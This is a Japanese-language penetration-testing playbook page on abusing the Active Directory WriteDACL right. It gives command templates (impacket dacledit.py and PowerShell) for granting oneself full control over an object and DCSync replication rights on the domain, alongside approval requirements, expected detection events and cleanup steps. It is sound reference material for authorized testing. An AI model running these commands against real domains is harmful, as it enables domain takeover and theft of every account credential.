# WriteDACL の悪用

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [ ] 業務停止リスク（サービス・認証）
> - [x] 持続化に該当（ドメインオブジェクトへの DCSync 権限自己付与は壊滅的影響）
> - [x] 不可逆な設定変更を含む（DACL の追加変更）
> - [x] SIEM/EDR で確実に検知される（Event ID 5136 ディレクトリサービスオブジェクト変更、AD監査ログ）
>
> 実施可否は事前合意で明示確認すること。付与した ACE の削除（原状回復）必須。演習環境（HTB / OSCP 等）では制約なし。

## 概要

`WriteDACL` は対象オブジェクトの DACL（Discretionary Access Control List）を変更する権限。自分自身または任意のユーザーに `GenericAll` 相当の権限を付与することで、間接的に完全制御を得られる。

---

## 着火条件

BloodHound で `[現在のユーザー or グループ] --WriteDACL--> [ターゲットオブジェクト]` が確認できた場合。

---

## 悪用手順

### ステップ1: 自分自身に GenericAll を付与する

```bash
# impacket の dacledit を使用
dacledit.py -action write \
  -rights FullControl \
  -principal '[CURRENT_USER]' \
  -target '[TARGET_OBJECT]' \
  '[DOMAIN]/[CURRENT_USER]:[PASSWORD]' \
  -dc-ip [DC_IP]
```

または PowerShell（Windows シェル内から）：
```powershell
$ACL = Get-ACL "AD:[TARGET_OBJECT_DN]"
$SID = (Get-ADUser [CURRENT_USER]).SID
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $SID, 
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow
)
$ACL.AddAccessRule($ACE)
Set-ACL "AD:[TARGET_OBJECT_DN]" $ACL
```

### ステップ2: GenericAll を使って目的の操作を実施

→ `GenericAll.md` の手法を適用

---

## ドメインオブジェクトへの WriteDACL（DCSync 権限の付与）

ドメインオブジェクト自体（`DC=domain,DC=tld`）に WriteDACL がある場合、DCSync に必要な複製権限を自分自身に付与できる。

```bash
# DS-Replication-Get-Changes と DS-Replication-Get-Changes-All を付与
dacledit.py -action write \
  -rights DCSync \
  -principal '[CURRENT_USER]' \
  -target-dn 'DC=[DOMAIN],DC=[TLD]' \
  '[DOMAIN]/[CURRENT_USER]:[PASSWORD]' \
  -dc-ip [DC_IP]
```

→ その後 DCSync を実行: `../Credential_Dumping.md`

---

## 注意点・落とし穴

- DACL の変更はイベントログに記録される（セキュリティ上の痕跡が残る）
- 付与した権限は調査後にクリーンアップすることが望ましい
- ドメインオブジェクトへの変更は特に影響が大きいため慎重に操作する

---

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。ドメインオブジェクトへの DCSync 権限自己付与はドメイン全体に対する壊滅的影響を持つ
- **想定されるSIEM/EDR検知**:
  - Event ID 5136（ディレクトリサービスオブジェクトの変更：DACL 編集）
  - Event ID 4670（オブジェクトの権限変更）
  - Defender for Identity / SIEM の DACL 改ざんアラート
- **業務影響リスク**: なし（参照権限の追加のみだが、悪用されると全ドメイン認証情報流出の起点となる）
- **原状回復必須項目**:
  - ✅ 自己付与した GenericAll / DCSync 権限（`DS-Replication-Get-Changes` / `DS-Replication-Get-Changes-All`）の削除（`dacledit.py -action remove`）
  - ✅ 変更前の DACL を BloodHound 等で記録しておき、テスト完了時に同等の状態へ戻す
  - ✅ 派生して取得した認証情報は Credential_Dumping.md の原状回復項目に従う
- **取得情報の取扱**: ACE 変更の証跡（変更前後の DACL ダンプ）をテストレポートに添付。テスト完了時に変更を復旧
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術
- 前：`../../05_Tools_Reference/BloodHound.md`（BloodHound で WriteDACL 権限を発見後）
- 後：`./GenericAll.md`（GenericAll を自己付与後に実施する操作）
- 後：`../Credential_Dumping.md`（DCSync 権限付与後に DCSync を実行）
